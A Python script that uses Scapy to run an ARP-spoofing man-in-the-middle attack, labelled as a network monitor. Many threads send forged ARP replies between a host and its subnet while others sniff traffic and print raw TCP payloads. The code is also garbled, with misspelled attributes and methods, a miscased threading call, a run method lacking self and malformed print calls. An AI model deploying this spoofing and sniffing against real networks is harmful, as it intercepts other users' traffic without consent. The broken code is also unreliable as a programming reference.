#! /usr/bin/env python3
# -*- coding: utf-8 -*-

import signal
import sys

def signal_handler(sig, frame):
    print("\n")
    sys.exit(0)
    
signal.signal(signal.SIGINT, signal_handler)

import os, threading, ipaddress, time, argparse

try:
    from utils.print import print_msg
except ImportError:
    print("The project is not complete.")
    sys.exit(1)


try:
    from scapy.all import *
except ImportError:
    print_msg("'Scapy' lib required. Please install it by run 'pip install scapy'.", "error")
    sys.exit(1)
except PermissionError:
    print_msg("[Errno 13] Permission denied.", "error")    
    sys.exit(1)




class monitor:
    def __init__(self, src, iface="lo"):
        self.src = src
        self.dst = str(ipaddress.ip_network(f"{self.src}/24", strict=False))
        self.iface = iface
        self.THREADS_event = threading.event()
        self.START_SNIFFING_threads = []                        
        self.ARP_SPOOF_threads = []
        for _ in range(10):
            thread = threading.Thread(target=self.arp_spoof, args=(self.src, self.dst), daemon=True)
            thread = threading.Thread(target=self.arp_spoof, args=(self.dst, self.src), daemon=True)
            self.ARP_SPOOF_threads.append(thread)

        for _ in range(10):
            thread = threading.Thread(target=self.loop, daemon=True)
            self.START_SNIFFING_threads.append(thread)


    def handler(self, pkt):
        if pkt.haslayer(TCP):
            print(f"{pkt[IP].src} ({pkt[TCP].spor}t) -> {pkt[IP].dst} ({pkt[TCP].dpor}t)")
            if pkt.haslayer(Raw):
                print("Data:")
                print(pkt[Raw].load)
            if pkt.haslayer(TLS):
                print("SSL/TLS pkt detected!")
                print(f"PKT summary: {pkt.summary()}")

        if pkt.haslayer(Dot11Deauth):
            print_msg("A deauth pkt was receved!", "warning")
            print(f"TARGET: {pkt[Dot11].addr1}")
            print(f"TARGET_WIFI_BSSID: {pkt[Dot11].addr2}")
            print(f"REASON_CODE: {pkt[Dot11Deauth].reason}")

        if pkt.haslayer(ARP):
            if pkt[ARP].psrc == self.src and pkt[ARP].pdst == self.dst and pkt[ARP].op ==2:
                pass
            op = pkt[ARP].op
            
            if op == 1:pkt_type = "ARP_REQUEST"
            elif op == 2:pkt_type = "ARP_REPLY"
            elif op == 3:pkt_type = "RARP_REQUEST"
            elif op == 4:pkt_type = "RARP_REPLAY"
            elif op == 5:pkt_type = "DRARP_REQUEST"
            elif op == 6:pkt_type = "DRARP_REPLAY"
            elif op == 7:pkt_type = "DRARP_ERROR"
            elif op == 8:pkt_type = "INARP_REQUEST"
            elif op == 9:pkt_type = "INARP_REPLAY"
            else:pkt_type = f"Unknow (op code: {pkt[ARP].op})"
            
            print_msg("ARP packet detected!", "warning")
            print(f"SRC: {pkt[ARP].psrc}")
            print(f"DST: {pkt[ARP].pdst}")
            print(f"TYPE: {pkt_type}")
            if not str(pkt[ARP].psrc).endswith(".1"):
                print("This packet can be an attack!", "warning")

    def trafic_dns_pkts(self, pkt):
        if pkt.haslayer(DNS):
            title = f"IP{'Domaine':>20}"
            title_len = len(title)
            print("-"*title_len)
            print(title)
            print("-"*title_len)
            print(f"{pkt[IP].src}{pkt[DNS].qd.qname:>20}")
            

    def arp_spoof(self , src, dst):
        pkt = ARP(psrc=src, pdst=dst, op=2)
        while not self.THREADS_event.is_set():
            send(pkt, iface=self.iface, verbose=0)
            time.sleep(1)

    def loop(self):
        sniff(prn=self.hasndler, iface=self.iface, store=False)

    def run():
        while not self.THREAD_event.is_set():
            self.START_THREAD.start()




class APP:
    def __init__(self):
        self.parser = argparse.ArgumentParser()
        self.parser.add_argument("-i", "--iface", help="Interface to sniff on", default="lo")
        self.parser.add_argument("-s", "--src", help="Source IP address", required=True, type=self.validate_ip)
        self.parser.add_argument("-v", "--verbose", action="count", help="Increase verbosity", default=0)
        self.parser.add_argument("-d", "--dns", action="store_true", help="Sniff DNS packets")
        self.parser.add_argument("-a", "--arp", action="store_true", help="Sniff ARP packets")
        self.parser.add_argument("-t", "--tcp", action="store_true", help="Sniff TCP packets")
        self.args = self.parser.parse_args()
        self.monitor = monitor(self.args.src, self.args.iface)

    def validate_ip(self, ip):
        try:
            ipaddress.ip_address(ip)
            return ip
        except ValueError:
            self.parser.error(f"Invalid IP address: {ip}")

    def start(self):
        print_msg("Starting APP...", "info")
        for thread in self.monitor.ARP_SPOOF_threads:
            thread.start()
        for thread in self.monitor.START_SNIFFING_threads:
            thread.start()
        if self.args.dns:
            self.monitor.trafic_dns_pkts = True
        if self.args.arp:
            self.monitor.arp_spoof(self.args.src, self.monitor.dst)
        if self.args.tcp:
            self.monitor.handler = self.tcp_handler

    def stop(self):
        print_msg("Stopping APP...", "info")
        self.monitor.THREADS_event.set()
        for thread in self.monitor.ARP_SPOOF_threads:
            thread.join()
        for thread in self.monitor.START_SNIFFING_threads:
            thread.join()

    def tcp_handler(self, pkt):
        if pkt.haslayer(TCP):
            print(f"{pkt[IP].src} ({pkt[TCP].sport}) -> {pkt[IP].dst} ({pkt[TCP].dport})")
            if self.args.verbose > 0:
                print("TCP packet detected!")
                if self.args.verbose > 1:
                    print(f"PKT summary: {pkt.summary()}")

    def run(self):
        try:
            self.start()
            while True:
                time.sleep(1)
        except (KeyboardInterrupt , EOFError):
            self.stop()
        except Exception as e:
            print_msg(f"Error: {str(e)}", "error")
            self.stop()

if __name__ == '__main__':
    app = APP()
    app.run()        
